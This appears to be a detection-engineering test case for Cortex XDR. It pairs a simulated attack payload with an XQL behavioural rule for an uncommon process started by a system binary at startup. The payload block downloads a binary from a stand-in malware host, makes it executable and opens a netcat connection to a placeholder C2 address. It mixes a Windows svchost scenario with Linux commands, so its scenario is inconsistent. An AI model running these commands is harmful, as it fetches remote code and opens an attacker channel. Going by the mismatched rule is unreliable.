identity.name: Uncommon Process Execution by System Binary at Startup
identity.summary: An attacker uses a system binary to execute an uncommon process with a local user SID during early startup. Cortex should detect this behavior as a deviation from normal system process execution patte
identity.description: An attacker uses a system binary to execute an uncommon process with a local user SID during early startup. Cortex should detect this behavior as a deviation from normal system process execution patterns. The attack involves leveraging a trusted binary to spawn a suspicious child process.

techniques.name: Masquerading: Match Legitimate Name or Location
Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

payload.code:
mkdir -p /tmp/scratch
wget -O /tmp/scratch/malware.bin https://malware-family.example.com/malware
chmod +x /tmp/scratch/malware.bin
C2_IP="192.0.2.10"
C2_PORT=443
nc -v $C2_IP $C2_PORT

expected_artifacts.description: Execution of a suspicious binary by a system binary

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Uncommon Process with User SID at Early Startup
biocs.description: Detection of a process started by a system binary with a non-system user SID during early system startup
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'svchost.exe'
| filter action_process_image_name = '/tmp/scratch/malware.bin'
| filter process_user_sid contains 'S-1-5-21'
| filter process_start_time < '00:10:00'
